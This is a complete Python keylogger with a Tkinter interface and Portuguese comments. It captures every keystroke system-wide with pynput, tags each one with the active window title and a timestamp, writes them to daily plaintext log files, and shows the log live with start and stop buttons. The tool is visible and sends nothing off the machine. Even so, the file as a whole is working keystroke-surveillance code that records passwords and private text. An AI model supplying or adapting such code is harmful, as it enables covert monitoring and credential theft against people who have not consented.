from pynput import keyboard
import pygetwindow as gw
import os
from datetime import datetime
import tkinter as tk
from tkinter import ttk, scrolledtext
from threading import Thread, Event

# Variáveis de controle
stop_event = Event()
is_logging = False

# Função para obter o nome da janela ativa
def get_active_window():
    window = gw.getActiveWindow()
    if window:
        return window.title
    return "Unknown"

# Função para gerar o nome do arquivo de log com base na data atual
def get_log_filename():
    today = datetime.now().strftime("%Y-%m-%d")  # Formato de data: YYYY-MM-DD
    return f"keylog_{today}.txt"

# Função que será chamada sempre que uma tecla for pressionada
def on_press(key):
    if stop_event.is_set():
        return

    if key == keyboard.Key.esc:
        # Saída do programa
        stop_event.set()
        print("Cancelando a execução...")
        root.quit()  # Fechar a interface gráfica
        return

    window_title = get_active_window()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Hora atual no formato YYYY-MM-DD HH:MM:SS

    try:
        key_char = key.char
    except AttributeError:
        key_char = str(key)

    # Obter o nome do arquivo de log para o dia atual
    log_filename = get_log_filename()

    with open(log_filename, "a", encoding="utf-8") as log_file:
        log_entry = f"[{timestamp}] Window: {window_title}, Key: {key_char}"
        log_file.write(log_entry + "\n")

    # Atualizar a visualização do log
    update_log_view()

# Função para iniciar o listener em um thread separado
def start_logging():
    global is_logging
    if not is_logging:
        is_logging = True
        listener_thread = Thread(target=run_listener)
        listener_thread.start()
        status_label.config(text="Logging: Iniciado")
    else:
        status_label.config(text="Logging: Já está em execução")

# Função que executa o listener
def run_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Função para parar o listener
def stop_logging():
    global is_logging
    if is_logging:
        stop_event.set()
        is_logging = False
        status_label.config(text="Logging: Parado")

# Função para atualizar a visualização do log
def update_log_view():
    log_filename = get_log_filename()
    if os.path.exists(log_filename):
        with open(log_filename, "r", encoding="utf-8") as log_file:
            log_content = log_file.read()
            log_text.delete(1.0, tk.END)  # Limpar o texto existente
            log_text.insert(tk.END, log_content)  # Inserir o novo conteúdo
    else:
        log_text.delete(1.0, tk.END)  # Limpar o texto existente
        log_text.insert(tk.END, "Nenhum log encontrado.")

# Função para atualizar o log a cada 1 segundo
def periodic_update():
    update_log_view()
    root.after(1000, periodic_update)  # Atualiza a cada 1 segundo

# Configuração da interface gráfica
root = tk.Tk()
root.title("Keylogger")

# Criação das abas
tab_control = ttk.Notebook(root)
log_tab = ttk.Frame(tab_control)
tab_control.add(log_tab, text="Log")
tab_control.pack(expand=True, fill=tk.BOTH)

# Adicionando o texto de visualização do log
log_text = scrolledtext.ScrolledText(log_tab, wrap=tk.WORD, height=20, width=80)
log_text.pack(expand=True, fill=tk.BOTH)

# Botões de controle
control_frame = tk.Frame(root)
control_frame.pack(pady=10)

start_button = tk.Button(control_frame, text="Iniciar", command=start_logging)
start_button.pack(side=tk.LEFT, padx=5)

stop_button = tk.Button(control_frame, text="Parar", command=stop_logging)
stop_button.pack(side=tk.LEFT, padx=5)

status_label = tk.Label(control_frame, text="Logging: Parado")
status_label.pack(side=tk.LEFT, padx=5)

# Iniciar a atualização periódica
root.after(1000, periodic_update)  # Atualiza a cada 1 segundo

# Iniciar a interface gráfica
root.mainloop()
